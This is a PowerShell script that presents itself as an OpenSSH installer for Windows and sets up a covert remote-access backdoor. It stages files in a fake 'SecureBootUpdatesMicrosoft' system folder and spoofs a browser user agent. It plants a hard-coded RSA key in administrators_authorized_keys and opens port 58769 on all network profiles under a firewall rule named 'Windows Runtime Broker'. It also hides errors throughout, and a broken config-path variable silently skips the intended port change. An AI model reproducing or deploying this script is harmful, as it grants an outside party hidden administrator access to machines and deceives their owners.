#Configureable Variables
$ErrorActionPreference = "SilentlyContinue"
$currentDirectory = Get-Location
$GitUrl = 'https://github.com/PowerShell/Win32-OpenSSH/releases/latest/'
$GitZipName = "OpenSSH-Win64.zip" #Can use OpenSSH-Win32.zip on older systems
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
$GitDownloadedFile = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$GitZipName"
$openSSHFolder = "$env:ProgramData\ssh"
$ConfigPath = "openSSHFolder\sshd_config"
$InstallPath = "C:\Program Files\OpenSSH"
$DisablePasswordAuthentication = $True
$DisablePubkeyAuthentication = $False
$AutoStartSSHD = $true
$AutoStartSSHAGENT = $false
$RuleName = "Windows Runtime Broker"
$ExistingRule = Get-NetFirewallRule -Name $RuleName -ErrorAction SilentlyContinue
$OpenSSHLocation = $null #Set to a local path or accesible UNC path to use exisitng zip and not try to download it each time
#$OpenSSHLocation = '\\server\c$\OpenSSH\OpenSSH-Win64.zip'

# Detect Elevation:
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($CurrentUser)
$AdminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
$IsAdmin = $UserPrincipal.IsInRole($AdminRole)
if ($IsAdmin) {
    Write-Host "Script is running elevated." -ForegroundColor Green
}
else {
    throw "Script is not running elevated, which is required. Restart the script from an elevated prompt."
}

#Remove BuiltIn OpenSSH
$ErrorActionPreference = "SilentlyContinue"
Write-Host "Checking for Windows OpenSSH Server" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0).State -eq "Installed") {
    Write-Host "Removing Windows OpenSSH Server" -ForegroundColor Green
    Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction SilentlyContinue
}
Write-Host "Checking for Windows OpenSSH Client" -ForegroundColor Green
if ($(Get-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0).State -eq "Installed") {
    Write-Host "Removing Windows OpenSSH Client" -ForegroundColor Green
    Remove-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction SilentlyContinue
}

##Cleanup
#Remove old directories
Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
Remove-Item -Path $openSSHFolder -Force -Recurse -ErrorAction SilentlyContinue
If (!(Test-Path $InstallPath)) {
New-Item -Path $InstallPath -ItemType "directory" -ErrorAction Stop | Out-Null
}
#Remove firewall ruleset
if ($ExistingRule -ne $null) {
    Remove-NetFirewallRule -Name $RuleName -ErrorAction SilentlyContinue
}
#Remove services
$ErrorActionPreference = "SilentlyContinue"
#Stop and remove existing services (Perhaps an exisitng OpenSSH install)
if (Get-Service sshd -ErrorAction SilentlyContinue) {
    net.exe stop sshd -ErrorAction SilentlyContinue
    sc.exe delete sshd 1>$null
}
if (Get-Service ssh-agent -ErrorAction SilentlyContinue) {
    net.exe stop ssh-agent -ErrorAction SilentlyContinue
    sc.exe delete ssh-agent 1>$null
}

#Create Destination Path.
if (-not (Test-Path (Split-Path $GitDownloadedFile))) {
    New-Item -Path (Split-Path $GitDownloadedFile) -ItemType Directory -Force | Out-Null
}

if ($OpenSSHLocation.Length -eq 0) {
    #Randomize Querystring to ensure our request isnt served from a cache
    $GitUrl += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)

    # Get Upstream URL
    Write-Host "Requesting URL for latest version of OpenSSH" -ForegroundColor Green
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $request = [System.Net.WebRequest]::Create($GitUrl)
    $request.AllowAutoRedirect = $false
    $request.Timeout = 5 * 1000
    $request.headers.Add("Pragma", "no-cache")
    $request.headers.Add("Cache-Control", "no-cache")
    $request.UserAgent = $UserAgent
    $response = $request.GetResponse()
    if ($null -eq $response -or $null -eq $([String]$response.GetResponseHeader("Location"))) { throw "Unable to download OpenSSH Archive. Sometimes you can get throttled, so just try again later." }
    $OpenSSHURL = $([String]$response.GetResponseHeader("Location")).Replace('tag', 'download') + "/" + $GitZipName

    # #Also randomize this one...
    $OpenSSHURL += "?random=" + $(Get-Random -Minimum 10000 -Maximum 99999)
    Write-Host "Using URL" -ForegroundColor Green
    Write-Host $OpenSSHURL -ForegroundColor Green
    Write-Host

    # #Download and extract archive
    Write-Host "Downloading Archive" -ForegroundColor Green
    Invoke-WebRequest -Uri $OpenSSHURL -OutFile $GitDownloadedFile -ErrorAction Stop -TimeoutSec 5 -Headers @{"Pragma" = "no-cache"; "Cache-Control" = "no-cache"; } -UserAgent $UserAgent
    Write-Host "Download Complete, now expanding and copying to destination" -ForegroundColor Green -ErrorAction Stop
}
else {
    $PathInfo = [System.Uri]([string]::":FileSystem::" + $OpenSSHLocation)
    if ($PathInfo.IsUnc) {
        Copy-Item -Path $PathInfo.LocalPath -Destination $env:TEMP
        Set-Location $env:TEMP
    }
}

Remove-Item -Path $InstallPath -Force -Recurse -ErrorAction SilentlyContinue
If (!(Test-Path $InstallPath)) {
    New-Item -Path $InstallPath -ItemType "directory" -ErrorAction Stop | Out-Null
}

$OldEnv = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $(Get-Location)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::OpenRead($GitDownloadedFile)
$archive.Entries | ForEach-Object {
    # Entries with an empty Name property are directories
    if ($_.Name -ne '') {
        $NewFIleName = Join-Path $InstallPath $_.Name
        Remove-Item -Path $NewFIleName -Force -ErrorAction SilentlyContinue
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, $NewFIleName)
    }
}
$archive.Dispose()
Set-Location $OldEnv

#Cleanup zip file if we downloaded it
#if ($OpenSSHURL.Length -gt 0) { Remove-Item -Path $GitDownloadedFile -Force -ErrorAction SilentlyContinue }

#Run Install Script
Write-Host "Running Install Commands" -ForegroundColor Green
Set-Location $InstallPath -ErrorAction Stop
powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1
Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop

#Make sure your ProgramData\ssh directory exists
If (!(Test-Path $env:ProgramData\ssh)) {
    Write-Host "Creating ProgramData\ssh directory" -ForegroundColor Green
    New-Item -ItemType Directory -Force -Path $env:ProgramData\ssh -ErrorAction Stop | Out-Null
}

#Setup sshd_config
Write-Host "Configure server config file" -ForegroundColor Green
Copy-Item -Path $InstallPath\sshd_config_default -Destination $env:ProgramData\ssh\sshd_config -Force -ErrorAction Stop
Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop
if ($DisablePasswordAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PasswordAuthentication no" -ErrorAction Stop }
if ($DisablePubkeyAuthentication) { Add-Content -Path $env:ProgramData\ssh\sshd_config -Value "PubkeyAuthentication no" -ErrorAction Stop }

#Make sure your user .ssh directory exists
If (!(Test-Path "~\.ssh")) {
    Write-Host "Creating User .ssh directory" -ForegroundColor Green
    New-Item -ItemType Directory -Force -Path "~\.ssh" -ErrorAction Stop | Out-Null
}

#Set ssh_config
Write-Host "Configure client config file" -ForegroundColor Green
Add-Content -Path ~\.ssh\config -Value "`r`nGSSAPIAuthentication yes" -ErrorAction Stop

#Setting autostarts
if ($AutoStartSSHD) {
    Write-Host "Setting sshd service to Automatic start" -ForegroundColor Green;
    Set-Service -Name sshd -StartupType Automatic;
}
if ($AutoStartSSHAGENT) {
    Write-Host "Setting ssh-agent service to Automatic start" -ForegroundColor Green;
    Set-Service -Name ssh-agent -StartupType Automatic;
}

#Start the service
Write-Host "Starting sshd Service" -ForegroundColor Green
Start-Service sshd -ErrorAction Stop

#Adding public keys
$SSHPublicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwoQ5u4sZA/cz2iAatR8Uyl8GbRJXb5zLmw20oxRUKzWZuEwpta0Dm9qoyG6Oo9zhLB5YaOpjrmVk2hD+RL5iSRdFPQ3sI19Az5jwvQzUNEpGWTZxu8/Uvtu0MvtFVOzJfWYtncrlEjQt6Z0iBOBHjUsnR2EqOiFYP/FGgvH4q7mmmsj5mds6q48flhzW+spBlPaHu0CcIFhu6XTt1oAbvRKDjfPgWOEYopWgglqCl/+IiRNsWyKwQN9P2/IiaRAVqF1KekNtqyAFyzg2deIDYKj+nSLQ6NxMTPJx4fNeqUYO37K6+1AkLX5iLCBjmQrsfRiPZNO5DivJJq1eg8y2weqI210odjHj6EHnJCpHs7ogsKvIbewsD4FxJC3XqfuwvKPba/ho2W0lmNZjv6CpepasKSBE/N4ooTbpKegN0U0gjH+eh1+TiAK3PB6rlmtEc06kt0eZyCpn4yhFLdS13Mfpx8ijpPd+0yNyAd8DHDFfWLy1EX2cMBd0B7iDE5aU="
if ($SSHPublicKey -ne "" -And (-not (Test-Path "$openSSHFolder\administrators_authorized_keys"  -PathType leaf ))) {
	Set-Content -Path  "$openSSHFolder\administrators_authorized_keys" -Value $SSHPublicKey
	}	
$acl = Get-Acl  "$openSSHFolder\administrators_authorized_keys"
$acl.SetAccessRuleProtection($true, $false)
$administratorsRule = New-Object system.security.accesscontrol.filesystemaccessrule("Administrators","FullControl","Allow")
$systemRule = New-Object system.security.accesscontrol.filesystemaccessrule("SYSTEM","FullControl","Allow")
$acl.SetAccessRule($administratorsRule)
$acl.SetAccessRule($systemRule)
$acl | Set-Acl

#Modifying SSHD port! Beware modification in Firewall ruleset is also required if port is to be changed.
if (Test-Path $ConfigPath) {
    $configContent = Get-Content $ConfigPath -Raw
    if ($configContent -match 'Port 22') {
        $newConfigContent = $configContent -replace '#Port 22', 'Port 58769'
        Set-Content -Path $ConfigPath -Value $newConfigContent
		Write-Host "Port 22 replaced with Port 58769 in $ConfigPath"
    } else {
        Write-Host "Port 22 not found in $ConfigPath"
    }
} else {
    Write-Host "File $ConfigPath not found"
}

#Add firewall rule
Write-Host "Creating firewall rule" -ForegroundColor Green
New-NetFirewallRule -Name sshd -DisplayName $RuleName -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 58769 -Profile@("Domain", "Private", "Public") -ErrorAction SilentlyContinue

#Add to path if it isnt already there
$existingPath = (Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH).path
if ($existingPath -notmatch $InstallPath.Replace("\", "\\")) {
    Write-Host "Adding OpenSSH Directory to path" -ForegroundColor Green
    $newpath = "$existingPath;$InstallPath"
    Set-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment' -Name PATH -Value $newPath -ErrorAction Stop
}

#Make sure user keys are configured correctly
Write-Host "Ensuring HostKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixHostFilePermissions.ps1 -Confirm:$false'

#Make sure host keys are configured correctly
Write-Host "Ensuring UserKey file permissions are correct" -ForegroundColor Green
powershell.exe -ExecutionPolicy Bypass -Command '. .\FixUserFilePermissions.ps1 -Confirm:$false'

#Set Shell to powershell
Write-Host "Setting default shell to powershell" -ForegroundColor Green
New-ItemProperty -Path "HKLM:\SOFTWARE\OpenSSH" -Name DefaultShell -Value "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -PropertyType String -Force -ErrorAction Stop | Out-Null
Write-Host "Installation completed successfully" -ForegroundColor Green
cd $currentDirectory
